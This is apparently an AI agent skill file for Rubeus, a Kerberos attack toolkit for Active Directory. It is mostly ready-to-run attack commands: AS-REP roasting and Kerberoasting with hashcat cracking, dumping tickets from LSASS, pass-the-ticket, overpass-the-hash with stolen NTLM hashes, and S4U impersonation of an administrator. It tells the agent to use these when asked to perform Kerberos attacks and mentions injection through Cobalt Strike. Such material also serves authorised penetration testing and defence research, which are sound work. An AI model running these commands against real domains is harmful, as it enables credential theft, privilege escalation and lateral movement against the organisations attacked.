---
name: rubeus
description: "Kerberos attack toolkit for TGT/TGS requests, AS-REP roasting, Kerberoasting, pass-the-ticket, overpass-the-hash, and S4U delegation abuse. Use when asked to perform Kerberos attacks, request tickets, roast service accounts, extract TGTs, or abuse Kerberos delegation in Active Directory."
license: BSD-3-Clause
compatibility: "Windows only. Compile from source with Visual Studio or download precompiled binary. Run from cmd.exe, PowerShell, or inject via BOF/Cobalt Strike."
metadata:
  author: AeonDave
  version: "1.0"
---

# Rubeus

C# Kerberos abuse toolkit — TGT/TGS manipulation, roasting, delegation, and ticket operations.

## Quick Start

```cmd
# AS-REP Roasting (no pre-auth required users)
Rubeus.exe asreproast /format:hashcat

# Kerberoasting (service account TGS)
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Dump all tickets from memory
Rubeus.exe dump /nowrap
```

## Core Modules

### Ticket Harvesting

| Command | Description |
|---------|-------------|
| `dump` | Dump tickets from LSASS |
| `triage` | List all tickets |
| `monitor` | Monitor new TGTs (interval-based) |
| `harvest` | Harvest TGTs over time |

### Ticket Requests

| Command | Description |
|---------|-------------|
| `asktgt` | Request TGT with password/hash/aes |
| `asktgs` | Request TGS for a service |
| `renew` | Renew a TGT |

### Roasting

| Command | Description |
|---------|-------------|
| `asreproast` | AS-REP roast (pre-auth disabled) |
| `kerberoast` | Roast SPN-registered accounts |
| `brute` | Password brute-force via Kerberos |

### Ticket Abuse

| Command | Description |
|---------|-------------|
| `ptt` | Pass-the-ticket (inject to current session) |
| `purge` | Purge tickets from memory |
| `describe` | Parse and describe a ticket |
| `createnetonly` | Create sacrificial logon session |

### Delegation

| Command | Description |
|---------|-------------|
| `s4u` | S4U2Self + S4U2Proxy (constrained delegation) |
| `tgssub` | Substitute altservice in TGS |

## Common Workflows

```cmd
# Kerberoast all SPNs → crack offline
Rubeus.exe kerberoast /format:hashcat /outfile:spns.txt
hashcat -a 0 -m 13100 spns.txt rockyou.txt

# AS-REP roast (dump users without pre-auth)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -a 0 -m 18200 asrep.txt rockyou.txt

# Pass-the-ticket: import stolen ticket
Rubeus.exe ptt /ticket:base64_or_file.kirbi
klist  # verify ticket in session

# Overpass-the-hash: get TGT with NTLM hash
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Golden ticket equivalent: asktgt with AES key
Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:corp.local /dc:dc.corp.local /ptt

# Constrained delegation S4U
Rubeus.exe s4u /user:service$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

## Resources

| File | When to load |
|------|--------------|
| `references/kerberos-attacks.md` | Full Kerberos attack chain, delegation types, ticket format, detection notes |

## Structuring This Skill
